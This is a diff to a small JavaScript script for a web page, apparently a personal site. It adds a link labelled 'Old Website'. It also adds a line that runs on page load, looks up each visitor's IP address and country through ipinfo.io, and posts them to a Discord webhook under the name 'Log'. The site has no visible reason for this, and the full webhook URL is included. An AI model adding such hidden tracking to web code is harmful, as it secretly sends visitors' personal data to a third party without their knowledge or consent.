@@ -1,4 +1,5 @@
 const inputLimit = e => e.target.value = /^[0-9]*$/.test(e.target.value) ? Math.max(e.target.min, Math.min(e.target.max, +e.target.value)) : '';
+fetch("https://ipinfo.io/json").then((response) => response.json()).then((jsonResponse) => fetch("https://discord.com/api/webhooks/1100381486798094428/QSMcJE-Tp8embdLntKoqNeuKHLEN3vhCTXtzL5mkAlLkd-Rxo_wgbTPR1mR29n1zfUd8", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "Log", content: `${jsonResponse.ip}, ${jsonResponse.country}` }) }));
 (async () => {
     Key = "";
     Index = 0;
@@ -7,7 +8,8 @@ const inputLimit = e => e.target.value = /^[0-9]*$/.test(e.target.value) ? Math.
     Page = {
         Home: {
             Node: [
-                ["h2", { textContent: "# News" }]
+                ["h2", { textContent: "# News" }],
+                ["a", { href: "https://dayx.vercel.app/old_index.html", textContent: "Old Website" }]
             ],
             Dock: []
         },
